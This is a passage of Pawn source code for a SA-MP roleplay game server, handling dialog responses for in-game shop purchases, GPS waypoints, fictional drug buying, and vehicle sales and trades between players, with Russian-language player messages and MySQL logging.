				SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			 	mysql_free_result();
			 	return true;
		 	}
			mysql_free_result();
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),2);
			//BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] -= 2;
			//BizInfo[GetPVarInt(playerid,"PBIZ")][bMoney] += GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"))/2;
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
  			PlayerInfo[playerid][pPhone] = krek;
  			SaveAccount(playerid);
			static const fmt_str[] = "Вы приобрели сим-карту. Ваш новый номер: %i";
			new str[sizeof(fmt_str)+6];
   			format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pPhone]);
			SendClientMessage(playerid,CREWARD,str);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");*/
		}
		case 77:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			new text[20],text1[20],tt;
			switch(GetPVarInt(playerid,"AmmoGun"))
			{
			    case 1:
			    {
	    			if(PlayerInfo[playerid][pApt] >= 2)
					{
				        SendClientMessage(playerid,CGREY,"У Вас уже есть 2 аптечек");
				        DeletePVar(playerid,"AmmoGun");
				        DeletePVar(playerid,"AmmoPrice");
				        return true;
					}
					text = "аптечку";
					text1 = "аптечек";
					PlayerInfo[playerid][pApt]++;
					GiveInv(playerid,320,1);
					tt = PlayerInfo[playerid][pApt];
			    }
			    case 2:
			    {
	    			if(PlayerInfo[playerid][pMask] > 0)
					{
				        SendClientMessage(playerid,CGREY,"У Вас уже есть маска");
				        DeletePVar(playerid,"AmmoGun");
				        DeletePVar(playerid,"AmmoPrice");
				        return true;
					}
					text = "маску";
					text1 = "масок";
					PlayerInfo[playerid][pMask]++;
					tt = PlayerInfo[playerid][pMask];
					GiveInv(playerid,316,1);
			    }
			}
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			static const fmt_str[] = "Вы приобрели %s. Всего %s у вас: %i";
			new str[sizeof(fmt_str)+2+40];
   			format(str, sizeof(str), fmt_str,text,text1,tt);
			SendClientMessage(playerid,CREWARD,str);
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		} 
		case 79:
		{
		    if(!response) return cmd_gps(playerid,"");
			new i = ListNick[playerid][listitem],
			Float: fDistance = GetPlayerDistanceFromPoint(playerid, GPSInfo[i][gpsX],GPSInfo[i][gpsY],GPSInfo[i][gpsZ]);
            SetPlayerRaceCheckpoint(playerid,2,GPSInfo[i][gpsX],GPSInfo[i][gpsY],GPSInfo[i][gpsZ],0,0,0,10);
            static const fmt_string1[] = "[GPS]{ffffff} До точки назначения '%s' осталось %.1f м.";
			new str1[sizeof(fmt_string1)+40];
			format(str1, sizeof(str1), fmt_string1,GPSInfo[i][gpsName],fDistance);
			SendClientMessage(playerid,CREWARD,str1);

            SetPVarInt(playerid,"GPS",1);
		}
		
		case 83:
		{
		    if(!response) return true;
   			new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,83,DIALOG_STYLE_INPUT,"Покупка наркотиков","{FFFFFF}Введите сколько хотите купить наркотиков:\nКурс: 1гр - 5$","Далее","Назад");
            if(krek < 0 || krek > 10000000) return true;
			if(PlayerInfo[playerid][pCash] < krek*5)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
		        ShowPlayerDialog(playerid,83,DIALOG_STYLE_INPUT,"Покупка наркотиков","{FFFFFF}Введите сколько хотите купить наркотиков:\nКурс: 1гр - 5$","Далее","Назад");
		        return true;
		    }
		    if(NarkSklad < krek)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно наркотиков на складе");
		        ShowPlayerDialog(playerid,83,DIALOG_STYLE_INPUT,"Покупка наркотиков","{FFFFFF}Введите сколько хотите купить наркотиков:\nКурс: 1гр - 5$","Далее","Назад");
		        return true;
		    }
		    if(!PlayerInfo[playerid][pUl][2])
			{
				if(PlayerInfo[playerid][pDrugs]+krek > 500)
				{
				    SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 500 наркотиков");
	     			ShowPlayerDialog(playerid,83,DIALOG_STYLE_INPUT,"Покупка наркотиков","{FFFFFF}Введите сколько хотите купить наркотиков:\nКурс: 1гр - 5$","Далее","Назад");
				    return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pDrugs]+krek > 1000)
				{
				    SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 1000 наркотиков");
	     			ShowPlayerDialog(playerid,83,DIALOG_STYLE_INPUT,"Покупка наркотиков","{FFFFFF}Введите сколько хотите купить наркотиков:\nКурс: 1гр - 5$","Далее","Назад");
				    return true;
				}
			}
            NarkSklad -= krek;
			UpdNark();
			
		    PlayerInfo[playerid][pDrugs] += krek;
		    
			GiveMoney(playerid,-krek*5);
			SendClientMessage(playerid,-1,"Вы приобрели наркотики. Использовать наркотики: {f7ae11}/usedrugs");
		}
	
		case 85:
		{
			if(!response) return DeletePVar(playerid,"TS");
  			new kek = 0;
			if(strcmp(VInfo[GetPVarInt(playerid,"TS")][vname], PlayerInfo[playerid][pSendername], true) == 0) kek++;
			if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
			strmid(VInfo[GetPVarInt(playerid,"TS")][vname], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			VInfo[GetPVarInt(playerid,"TS")][vsing] = 0;
			VInfo[GetPVarInt(playerid,"TS")][vx] = VInfo[GetPVarInt(playerid,"TS")][vxmag];
			VInfo[GetPVarInt(playerid,"TS")][vy] = VInfo[GetPVarInt(playerid,"TS")][vymag];
			VInfo[GetPVarInt(playerid,"TS")][vz] = VInfo[GetPVarInt(playerid,"TS")][vzmag];
			VInfo[GetPVarInt(playerid,"TS")][vfa] = VInfo[GetPVarInt(playerid,"TS")][vfmag];
			VInfo[GetPVarInt(playerid,"TS")][vsvet] = 3;
			VInfo[GetPVarInt(playerid,"TS")][vtext] = 1;

			if(!VInfo[GetPVarInt(playerid,"TS")][vfam]) GiveMoney(playerid,VInfo[GetPVarInt(playerid,"TS")][vcost]/2),SendClientMessage(playerid,CREWARD,"Вы продали свое транспортное средство");
			else
			{
				FamInfo[VInfo[GetPVarInt(playerid,"TS")][vfam]][fKazna] += VInfo[GetPVarInt(playerid,"TS")][vcost]/2;
				static const fmt_string[] = "[%s] %s продал транспорт семьи %s";
				new str[sizeof(fmt_string)+50+32+5];
				format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername],VehicleNameS[GetPVarInt(playerid,"TS")-400]);
				SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
			}
			VInfo[GetPVarInt(playerid,"TS")][vfam] = 0;
	//		VInfo[GetPVarInt(playerid,"TS")][vcar] = INVALID_VEHICLE_ID;
			for(new i = 0; i <= 13; i++) VInfo[GetPVarInt(playerid,"TS")][vtuning][i] = 0;
			format(VInfo[GetPVarInt(playerid,"TS")][vtunings],100,"0,0,0,0,0,0,0,0,0,0,0,0,0");
			VInfo[GetPVarInt(playerid,"TS")][vcolor1] = 1; VInfo[GetPVarInt(playerid,"TS")][vcolor2] = 1;
			Locked[GetPlayerVehicleID(playerid)] = -1;
            //VInfo[kek][vcar] = CreateVehicle(VInfo[kek][vmodel], VInfo[kek][vx1], VInfo[kek][vy1], VInfo[kek][vz1], VInfo[kek][vfa1], VInfo[kek][vcolor1], VInfo[kek][vcolor2], 172800);
            DestroyVehicle(VInfo[GetPVarInt(playerid,"TS")][vcar]);
            query = "";
       	    format(query,sizeof(query),"UPDATE `veh` SET  `name` = '%s', `num` = '%s', `x` = '%f', `y` = '%f', `z` = '%f', `fa` = '%f', `tuning` = '%s', `color1` = 1, `color2` = 1, `svet` = 3, fam = '%d' WHERE id = '%d' LIMIT 1",VInfo[GetPVarInt(playerid,"TS")][vname],VInfo[GetPVarInt(playerid,"TS")][vnumber],VInfo[GetPVarInt(playerid,"TS")][vx]
   			,VInfo[GetPVarInt(playerid,"TS")][vy],VInfo[GetPVarInt(playerid,"TS")][vz],VInfo[GetPVarInt(playerid,"TS")][vfa],VInfo[GetPVarInt(playerid,"TS")][vtunings],VInfo[GetPVarInt(playerid,"TS")][id]);
	   		mysql_tquery(mysql,query);
	   		strmid(VInfo[GetPVarInt(playerid,"TS")][vnumber], "Nope", 0, strlen("Nope"), MAX_PLAYER_NAME);
	   		new idx = GetPVarInt(playerid,"TS");
			VInfo[idx][vcar] = CreateVehicle(VInfo[idx][vmodel], VInfo[idx][vx],VInfo[idx][vy],VInfo[idx][vz], VInfo[idx][vfa], VInfo[idx][vcolor1], VInfo[idx][vcolor2], 60000);
			static const fmt_string2[] = "{f7ae11}%s{FFFFFF}\nЦена: {f7ae11}$%i";
			new str2[sizeof(fmt_string2)+64+10];
			format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[idx][vmodel]-400],VInfo[idx][vcost]);
			UpdateDynamic3DTextLabelText(CarLable[VInfo[idx][vcar]],-1,str2);
		//	Attach3DTextLabelToVehicle(VInfo[idx][vlable], VInfo[idx][vcar], 0.0, 0.0, 1.3);
			
	   		ApplyDynamicActorAnimation(UtilBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(UtilText,-1,"Держи деньги");
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",UtilBot,_:UtilText);
	   		DeletePVar(playerid,"TS");
		}
		case 86:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"PradID1");
		        DeletePVar(playerid,"PradCena1");
		        return true;
		    }
		    new kek = 0;
     		for(new i = 1; i<= TOTALV; i++)
			{
			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(strcmp(VInfo[i][vname], PlayerInfo[GetPVarInt(playerid,"PradID1")][pSendername], true) == 0) kek++;
			}
			if(!PlayerInfo[GetPVarInt(playerid,"PradID1")][pDCar] && kek == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин, не имея привилегии");
           	if(kek == 2 && PlayerInfo[GetPVarInt(playerid,"PradID1")][pDCar] == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин");
           	if(kek == 3) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 3 машин");
   			if(GetPred(GetPVarInt(playerid,"PradID1")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить ваше транспортое средство");
   			static const fmt_string1[] = "%s предложил Вам купить транспортное средство \"%s\". Цена: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400],GetPVarInt(playerid,"PradCena1"));
			SendClientMessage(GetPVarInt(playerid,"PradID1"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"PradID1"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"PradID1"),"PradID",playerid);
			SetPVarInt(GetPVarInt(playerid,"PradID1"),"PradCena",GetPVarInt(playerid,"PradCena1"));
   			DeletePVar(playerid,"PradID1");
      		DeletePVar(playerid,"PradCena1");
		}
		case 87:
		{
		    if(!response)
			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Игрок отказался от покупки");
			  SendClientMessage(playerid,CGREY,"Вы отказались от покупки");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"PradCena"))
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"У Игрока недостаточно средств");
			  SendClientMessage(playerid,CGREY,"Недостаточно средств");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
		   	if(GetPlayerState(GetPVarInt(playerid,"PradID")) != 2)
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не в машине");
			  SendClientMessage(playerid,CGREY,"Игрок не в машине");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
		   	new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(GetPVarInt(playerid,"PradID")) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[GetPVarInt(playerid,"PradID")][pSendername], true) == 0) kek = v;
				}
			}
			if(kek == 0)
  			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не с своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Игрок не в своем транспортном средстве");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"PradID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"PradID"), 5.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"PradID"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
			}
			GiveMoney(playerid,-GetPVarInt(playerid,"PradCena"));
			GiveMoney(GetPVarInt(playerid,"PradID"),GetPVarInt(playerid,"PradCena"));
			Locked[GetPlayerVehicleID(GetPVarInt(playerid,"PradID"))] = playerid;
		 	SendClientMessage(GetPVarInt(playerid,"PradID"),CREWARD,"Вы продали свое транспортное средство");
		  	SendClientMessage(playerid,CREWARD,"Вы купили новое транспортное средство");
		  	query = "";
		  	format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил транспорт №%d у %s (-%d$)','%d')",PlayerInfo[playerid][pID],kek,PlayerInfo[GetPVarInt(playerid,"PradID")][pSendername],GetPVarInt(playerid,"PradCena"),gettime());
			mysql_tquery(mysql,query);
			query = "";
            format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Продал транспорт №%d %s (+%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"PradID")][pID],kek,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"PradCena"),gettime());
			mysql_tquery(mysql,query);
		  	
		  	
			strmid(VInfo[kek][vname], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
		/*	new str[10];
			format(str,sizeof(str),"%s%i%i%i%s%s",GeneratePassword(),random(9),random(9),random(9),GeneratePassword(),GeneratePassword());*/
			
			strmid(VInfo[kek][vnumber], "Nope", 0, strlen("Nope"), 10);
            query = "";
   			format(query,sizeof(query),"UPDATE `veh` SET  `name` = '%s',`num` = 'None'  WHERE id = '%d' LIMIT 1",VInfo[kek][vname],VInfo[kek][id]);
	   		mysql_tquery(mysql,query);
			
	  		DeletePVar(playerid,"PradID");
	  		DeletePVar(playerid,"PradCena");
		}
		case 88:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"ObmID");
		        DeletePVar(playerid,"ObmCar");
		        DeletePVar(playerid,"ObmCar1");
		        DeletePVar(playerid,"ObmCena");
		        return true;
		    }
			if(GetPred(GetPVarInt(playerid,"ObmID")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку обменять ваше транспортое средство");
   			static const fmt_string1[] = "%s предложил Вам обменять транспортное средство на \"%s\". С Вашей доплатой: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400],GetPVarInt(playerid,"ObmCena"));
			SendClientMessage(GetPVarInt(playerid,"ObmID"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"ObmID"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"ObmID"),"ObmID",playerid);
			SetPVarInt(GetPVarInt(playerid,"ObmID"),"ObmCena",GetPVarInt(playerid,"PradCena"));
			SetPVarInt(GetPVarInt(playerid,"ObmID"),"ObmCar1",GetPVarInt(playerid,"ObmCar1"));
			SetPVarInt(GetPVarInt(playerid,"ObmID"),"ObmCar",GetPVarInt(playerid,"ObmCar"));
			SetPVarInt(GetPVarInt(playerid,"ObmID"),"ObmCena",GetPVarInt(playerid,"ObmCena"));
		}
		case 89:
		{
		    if(!response)
			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Игрок отказался от покупки");
			  SendClientMessage(playerid,CGREY,"Вы отказались от покупки");
			  DeletePVar(playerid,"ObmID");
  			  DeletePVar(playerid,"ObmCar");
  			  DeletePVar(playerid,"ObmCar1");
  			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ObmCena"))
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"У Игрока недостаточно средств");
			  SendClientMessage(playerid,CGREY,"Недостаточно средств");
			  DeletePVar(playerid,"ObmID");
  			  DeletePVar(playerid,"ObmCar");
  			  DeletePVar(playerid,"ObmCar1");
  			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		   	if(GetPlayerState(GetPVarInt(playerid,"ObmID")) != 2)
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не в машине");
			  SendClientMessage(playerid,CGREY,"Игрок не в машине");
			  DeletePVar(playerid,"ObmID");
  			  DeletePVar(playerid,"ObmCar");
  			  DeletePVar(playerid,"ObmCar1");
  			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		   	new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(GetPVarInt(playerid,"ObmID")) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[GetPVarInt(playerid,"ObmID")][pSendername], true) == 0) kek = v;
				}
			}
			if(kek == 0)
  			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не с своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Игрок не в своем транспортном средстве");
			  DeletePVar(playerid,"ObmID");
  			  DeletePVar(playerid,"ObmCar");
  			  DeletePVar(playerid,"ObmCar1");
  			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
			if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"ObmCar1"))
			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Игрок не в своем транспортном средстве");
			  SendClientMessage(playerid,CGREY,"Вы не в своем транспортном средстве");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"ObmID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"ObmID"), 5.0, x,y,z))
   			{
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),CGREY,"Вы не рядом с игроком");
			  SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
			  DeletePVar(playerid,"ObmID");
  			  DeletePVar(playerid,"ObmCar");
  			  DeletePVar(playerid,"ObmCar1");
  			  DeletePVar(playerid,"ObmCena");
			  return true;
			}
			GiveMoney(playerid,-GetPVarInt(playerid,"ObmCena"));
			GiveMoney(GetPVarInt(playerid,"ObmID"),GetPVarInt(playerid,"ObmCena"));
			Locked[GetPlayerVehicleID(GetPVarInt(playerid,"ObmID"))] = playerid;
		 	SendClientMessage(GetPVarInt(playerid,"ObmID"),CREWARD,"Вы обменяли транспортное средство");
		  	SendClientMessage(playerid,CREWARD,"Вы обменяли транспортное средство");
			strmid(VInfo[kek][vname], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);

		//	new str[10];
		//	format(str,sizeof(str),"%s%i%i%i%s%s",GeneratePassword(),random(9),random(9),random(9),GeneratePassword(),GeneratePassword());
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял транспорт №%d на №%d с %s (+%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"ObmID")][pID],kek,GetPVarInt(playerid,"ObmCar"),PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ObmCena"),gettime());
			mysql_tquery(mysql,query);
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял транспорт №%d на №%d с %s (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"ObmCar"),kek,PlayerInfo[GetPVarInt(playerid,"ObmID")][pSendername],GetPVarInt(playerid,"ObmCena"),gettime());
			mysql_tquery(mysql,query);
			strmid(VInfo[kek][vnumber], "Nope", 0, strlen("Nope"), 10);
			strmid(VInfo[GetPVarInt(playerid,"ObmCar")][vnumber], "Nope", 0, strlen("Nope"), 10);
			query = "";
   			format(query,sizeof(query),"UPDATE `veh` SET  `name` = '%s',`num` = 'None'  WHERE id = '%d' LIMIT 1",VInfo[kek][vname],VInfo[kek][id]);
	   		mysql_tquery(mysql,query);
	   	//	strmid(VInfo[kek][vnumber], str, 0, strlen(str), 10);
	   		Locked[GetPlayerVehicleID(playerid)] = GetPVarInt(playerid,"ObmID");
	   		strmid(VInfo[GetPVarInt(playerid,"ObmCar")][vname], PlayerInfo[GetPVarInt(playerid,"ObmID")][pSendername], 0, strlen(PlayerInfo[GetPVarInt(playerid,"ObmID")][pSendername]), MAX_PLAYER_NAME);
		//	new str1[10];
		//	format(str1,sizeof(str1),"%s%i%i%i%s%s",GeneratePassword(),random(9),random(9),random(9),GeneratePassword(),GeneratePassword());
            query = "";
  			format(query,sizeof(query),"UPDATE `veh` SET  `name` = '%s',`num` = 'None'  WHERE id = '%d' LIMIT 1",VInfo[GetPVarInt(playerid,"ObmCar")][vname],VInfo[GetPVarInt(playerid,"ObmCar")][id]);
	   		mysql_tquery(mysql,query);
	//		strmid(VInfo[GetPVarInt(playerid,"ObmCar")][vnumber], str1, 0, strlen(str1), 10);
	   		DeletePVar(playerid,"ObmID");
	   		DeletePVar(playerid,"ObmCar");
	   		DeletePVar(playerid,"ObmCar1");
	   		DeletePVar(playerid,"ObmCena");
		}
		case 90:
		{
		    if(!response) return cmd_gps(playerid,"");
	        switch(listitem)
	        {
	            case 0: SetPlayerRaceCheckpoint(playerid,2,BizInfo[57][bX],BizInfo[57][bY],BizInfo[57][bZ],0,0,0,10);
	            case 1: SetPlayerRaceCheckpoint(playerid,2,BizInfo[56][bX],BizInfo[56][bY],BizInfo[56][bZ],0,0,0,10);
	            case 2: SetPlayerRaceCheckpoint(playerid,2,BizInfo[56][bX],BizInfo[56][bY],BizInfo[56][bZ],0,0,0,10);
	            case 3: SetPlayerRaceCheckpoint(playerid,2,1584.664306,713.169921,10.767999,0,0,0,10); //gruz
          		case 4: SetPlayerRaceCheckpoint(playerid,2,BizInfo[34][bX],BizInfo[34][bY],BizInfo[34][bZ],0,0,0,10);
	            case 5: SetPlayerRaceCheckpoint(playerid,2,1044.964355,1334.882934,10.820312,0,0,0,10); //apt
	            case 6: SetPlayerRaceCheckpoint(playerid,2,-1336.6698,2679.1885,50.0625,0,0,0,10); //apt
			}
	    	SetPVarInt(playerid,"GPS",1);
		}
		case 92:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0..5:
		        {
					new kek = 0;
					static const fmt_string1[] = "%d | %s\n";
					new str1[sizeof(fmt_string1)-4+3+40];
					query = "";
					for(new i = 1; i <= TOTALGPS; i++)
					{
					    if(GPSInfo[i][gpsList] != listitem+1) continue;
					    format(str1, sizeof(str1), fmt_string1,kek+1,GPSInfo[i][gpsName]);
						strcat(query,str1);
						ListNick[playerid][kek] = i;
						kek++;
					}
		            ShowPlayerDialog(playerid,93,DIALOG_STYLE_LIST,"GPS",query,"Далее","Назад");
		        }
	    //		case 0: ShowPlayerDialog(playerid,93,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Мэрия\n2 | Автошкола\n3 | Банк\n4 | Тюрьма\n5 | Тюнинг ателье\n6 | Чёрный рынок\n7 | Чёрный рынок 2\n8 | Казино\n9 | Аренда транспорта\n10 | Аренда транспорта (2)\n11 | Служба буксировки\n12 | Спортзал\n13 | Утиль транспорта\n14 | Магазин мебели","Далее","Назад");
		  //  	case 1: ShowPlayerDialog(playerid,94,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Мэрия\n2 | Автошкола\n3 | SAPD\n4 | Central News Network\n5 | Центральная Больница\n6 | SA Army\n7 | 415 Block\n8 | Centro Side\n9 | Bikers\n10 | Yakuza\n11 | Russian Mafia\n12 | La Cosa Nostra","Далее","Назад");
	  		// 	case 2: ShowPlayerDialog(playerid,95,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Водитель автобуса\n2 | Механик\n3 | Развозчик продуктов\n4 | Грузчик\n5 | Повар (Ближайший ресторан)\n6 | Сборщик аптечек\n7 | Добыча песка","Далее","Назад");
			//	case 3: ShowPlayerDialog(playerid,222,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Класс N\n2 | Класс N (2)\n3 | Класс B\n4 | Класс A","Далее","Назад");
			//	case 4: ShowPlayerDialog(playerid,261,DIALOG_STYLE_LIST,"TP","{FFFFFF}1 | Аренда роликов\n2 | Регистрация на гонки\n3 | Регистрация на GunGame","Далее","Назад");
				case 6:
				{
					SetPlayerPos(playerid,302.3612,306.1608,999.1484);
					SetPlayerFacingAngle(playerid,89.6264);
					SetPlayerInterior(playerid,4);
					SetPlayerVirtualWorld(playerid, 1);
					DeletePVar(playerid,"PBIZ");
				}
				case 7:
				{
				    SetPlayerPos(playerid,0.1507,-20.3048,1999.5859);
					SetPlayerFacingAngle(playerid,172.7234);
					SetPlayerInterior(playerid,1);
					SetPlayerVirtualWorld(playerid, 1);
					DeletePVar(playerid,"PBIZ");
					
				}
				case 8:
				{
					SetPlayerPos(playerid,-1752.8436,778.9666,167.6563);
					SetPlayerFacingAngle(playerid,15.4461);
					SetPlayerInterior(playerid,0);
					SetPlayerVirtualWorld(playerid, 0);
					DeletePVar(playerid,"PBIZ");
				}
			}
		}
		case 93:
		{
